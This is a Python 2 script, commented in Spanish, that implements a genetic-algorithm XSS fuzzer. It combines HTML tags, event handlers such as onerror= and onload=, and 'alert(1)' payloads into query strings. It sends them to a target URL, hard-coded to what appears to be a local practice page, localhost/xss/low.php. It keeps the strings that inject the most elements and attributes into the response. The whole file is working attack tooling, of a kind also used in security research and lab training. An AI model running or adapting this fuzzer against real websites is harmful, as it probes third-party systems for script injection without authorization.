import requests			# comunicacion http
from requests.utils import quote # codificacion
import random			# generacion de numeros aleatorios
import urllib			# coneccion con el server
import sys			# comunicacion con el os
import webbrowser		# manejo de navegadores
from bs4 import BeautifulSoup	# analisis de codigo
from tidylib import tidy_document # analisis de codigo

# Clase que representa los genes del individuo
class grammar:
	def __init__(self):
		self.texts = ["abc "]
		self.spaces = [' '] 
		self.handlers = [' onerror=',' onload=',' onmouseEnter=',' onmouseLeave=',' onMouseOut=',' onmouseover=',
		' onpropertyChange=',' onreadyStateChange=',' onscroll=',' onResize=',' src=']
		self.asigns =  ['=']
		self.payloads = ['"alert(1)"','"javascript:alert(1)"']
		self.closers = ['>','">',"'>","/>"]
		self.tags = ['<a href ','<body ','<form ','<frameset ','<iframe ','<img ','<input ','<script ','<video ']
		self.data = [self.texts,self.spaces,self.handlers,self.payloads,self.tags,self.closers]

	# Metodo que regresa un gen
	def getGen(self):
		gentype = random.randint(0,len(self.data)-1)
		lengenpool = len(self.data[gentype])
		genidx = random.randint(0,lengenpool-1)
		return self.data[gentype][genidx]

# Clase para representar un individuo de la poblacion
class individual:
	def __init__(self):
		# genes del ejemplar	
		self.elems = []
		self.numelems = 0
		self.numatrs = 0
		self.numerrors = 0
		self.fitness = 0
	# Metodos para insertar genes al individuo
	def setData(self,data): self.elems.append(data)
	def setNumElems(self,numelems): self.numelems = numelems
	def setNumAtrs(self,numatrs): self.numatrs = numatrs
	def setNumErrors(self,numerrors): self.numerrors = numerrors
	def setFitness(self):
		try:
			self.fitness = self.numelems+self.numatrs - self.numerrors
		except Exception as e:
			self.fitness = 0
	def getSize(self): return len(self.elems)
	def __str__(self):
		tmp = ''
		for data in self.elems: tmp+=str(data)
		return tmp

# Agente fuzzer recibe
# 	recurl: recurso al que hacerle fuzzing
#	maxgenes: maximo numero de genes por individuos
#	maxind: numero maximo de individuos
#	it: maximo numero de iteraciones
class geneticalgorithm:
	def __init__(self,recurl,maxgenes=10,maxind=20,it=10,verbose=False):
		self.generation = 0
		self.mutation_rate = 3
		self.gram = grammar()
		self.recurl,self.maxgenes = recurl,maxgenes
		self.maxind,self.maxit= maxind,it
		self.individuals = []
		self.verbose = verbose
		# we got the default number for elements and number of attributes
		self.numelems,self.numatrs = self.testIndividual(self.recurl+'inicial')
		self.numerrors = self.testIndividual2(self.recurl+'inicial')
		print 'nmelems ',self.numelems
		print 'numatts ',self.numatrs
		print 'Running with\tMaxInd:%s\tMaxIt%s\tMaxGenes:%s' % (self.maxind,self.maxit,self.maxgenes)

	# ejecucion del algoritmo genetico
	def run(self):
		print '[*] Getting initial poblation'
		self.getInitialPoblation()
		print '[*] Initial poblation with %s individuals ' % len(self.individuals)
		self.getFitness()
		for i in range(0,self.maxit):
			# calculateFitness para todos los elementos
			print '*'*40,' Selecting iteration %s ' % i,'*'*40
			# seleccionamos
			self.select()
			# crossover
			print '*'*50,' Crossover','*'*50
			self.crossover()
			# calculamos el fitness
			print '*'*50,' Fitness','*'*50
			self.getFitness()
		self.individuals = sorted(self.individuals,key=lambda x: x.fitness,reverse=True)

	# Regresa la poblacion inicial
	def getInitialPoblation(self):
		for i in range(0,self.maxind):
			tmp = self.getIndividual()
			while self.inPool(tmp):
				tmp = self.getIndividual()
			self.individuals.append(tmp)

	# Regresa true si el elemento ya se encuentra en el pool genetico
	def inPool(self,ind):
		if ind in self.individuals: return True
		return False

	# Obtiene un individuo a partir de la gramatica
	def getIndividual(self):
		ind = individual()
		numgenes = random.randint(0,self.maxgenes)
		for i in range(0,numgenes):
			gen = self.gram.getGen()
			ind.setData(gen)
		return ind

	# Funcion que regresa el numero de elementos html y atributos producidos por la url
	def getFitness(self):
		for ind in self.individuals:
			# Al recurso original se agrega la representacion del individuo
			acturl = self.recurl+ind.__str__()
			# Obtenemos el numero de elementos y atributos de la pagina
			actnumelems,actnumatrs = self.testIndividual(acturl)
			ind.setNumElems(actnumelems)
			ind.setNumAtrs(actnumatrs)
			# Y el numero de errores
			numerrors = self.testIndividual2(acturl)
			ind.setNumErrors(numerrors)
			ind.setFitness()
			print '[elems:%s attrs:%s errors:%s,fitness:%s]: %s' % (actnumelems,actnumatrs,numerrors,ind.fitness,acturl)

	# Selecciona ejemplares de la poblacion
	def select(self):
		toremove = []
		# ordenamos por fitness
		self.individuals = sorted(self.individuals,key=lambda x: x.fitness,reverse=True)
		for ind in self.individuals:
			if self.verbose: print 'Checking [nelems:%s,nattrs:%s] %s' % (ind.numelems,ind.numatrs,ind)
			if ind.numelems <= self.numelems or ind.numatrs <=self.numatrs:
				toremove.append(ind)
		# eliminamos los elementos de pool en individuals
		if self.verbose:
			print '#'*20,'|toremove|: %s' % len(toremove)
			print '#'*20,'|individs|: %s' % len(self.individuals)
		# umbral selectivo
		idx = len(self.individuals)/2
		self.individuals = self.individuals[0:idx]
		print '#'*40,'SELECTED','#'*40
		for tmp in self.individuals:
			print '[nelems:%s,nattrs:%s,nerrors:%s,fit:%s]: %s' % (tmp.numelems,tmp.numatrs,tmp.numerrors,tmp.fitness,tmp)

	# crossover
	def crossover(self):
		newelems = []
		for ind in self.individuals:
			nextelem = self.individuals[random.randint(0,len(self.individuals)-1)]
			print '\n[Act]:%s \n[Nxt]:%s' % (ind,nextelem)
			# obtenemos el indice de cruce
			crossidx = ind.getSize()
			if crossidx > nextelem.getSize(): crossidx = nextelem.getSize()
			try:
				crossidx = random.randint(0,crossidx-1)
				# hacemos el cruce
				newelem1,newelem2 = individual(),individual()
				for elem in ind.elems[0:crossidx]+nextelem.elems[crossidx:]:
					newelem1.setData(elem)
				for elem in ind.elems[crossidx:]+nextelem.elems[0:crossidx]:
					newelem2.setData(elem)
				# Hacemos la mutacion
				r1,r2 = random.randint(0,10),random.randint(0,10)
				if r1 < self.mutation_rate: self.mutate(newelem1)
				if r2 < self.mutation_rate: self.mutate(newelem2)				
				print 'Result1: ',newelem1.__str__(),'\nResult2: ',newelem2.__str__()
				newelems.append(newelem1)
				newelems.append(newelem2)
			except Exception as e: pass
		self.individuals+=newelems

	# Cuenta el numero de elementos y sus atributos para verificar si hubo inyecciones
	def testIndividual(self,furl):
		r = urllib.urlopen(furl).read()
		soup = BeautifulSoup(r,"lxml")
		elems,atrs,numatrs = [],[],0
		for elm in soup.find_all():
			elems.append(elm)
			numatrs+=len(elm.attrs.values())
			atrs.append(elm.attrs.values())
		if self.verbose:
			print '\n','*'*70
			print 'Testing: %s' % (furl)
			print 'Response:\n%s' % r
			print '#Elems: %s' % (len(elems))
			print '#Attrs: %s' % (numatrs)
		return (len(elems),numatrs)

	# obtiene el numero de errores generados por la inyeccion
	def testIndividual2(self,furl):
		response = requests.get(furl).text
		document, errors = tidy_document(response)
		numerrors = errors.count('\n')
		if self.verbose:
			print '#Errors: %s' % (numerrors)
			print 'Errors:\n%s' % (errors)
			print '*'*70
		return numerrors

	# mutacion
	def mutate(self,ind):
		print 'Mutating '
		r = random.randint(0,1)
		# codificacion
		if r == 0:
			self.encode(ind)
		# intercambio
		else:
			self.swap(ind)	

	# codifica un gen del individuo
	def encode(self,ind):
		try:
			size = ind.getSize()
			idx = random.randint(0,size-1)
			gen = ind.elems[idx]
			mgen = quote(gen)
			if self.verbose: print 'Encoding %s ' % ind
			ind.elems[idx] = mgen
			if self.verbose: print ind
		except Exception as e:
			print e

	# intercambia genes en los individuos
	def swap(self,ind):
		try:
			size = ind.getSize()
			idx1 = random.randint(0,size-1)
			idx2 = random.randint(0,size-1)
			if self.verbose:
				print 'Swap:\t%s ' % (ind)
				print 'idx1 %s idx2 %s' % (ind.elems[idx1],ind.elems[idx2])
			gen1,gen2 = ind.elems[idx1],ind.elems[idx2]
			ind.elems[idx2] = gen1
			ind.elems[idx1] = gen2
			if self.verbose: print ind
		except Exception as e:
			print e

	# Regresa los resultados
	def showResults(self):
		print '\n'*5,'*'*100
		for pind in genalg.individuals:
			tmp = "%s%s" %(genalg.recurl,pind.__str__())
			print '[nelems:%s,nattrs:%s,errors:%s,fit:%s]: %s' % (pind.numelems,pind.numatrs,pind.numerrors,pind.fitness,tmp)
			#webbrowser.get('chromium').open(tmp)
		print '*'*100

# recurl,maxgenes,maxind,maxit
genalg = geneticalgorithm('http://localhost/xss/low.php?name=',10,50,10,True)
genalg.run()
genalg.showResults()
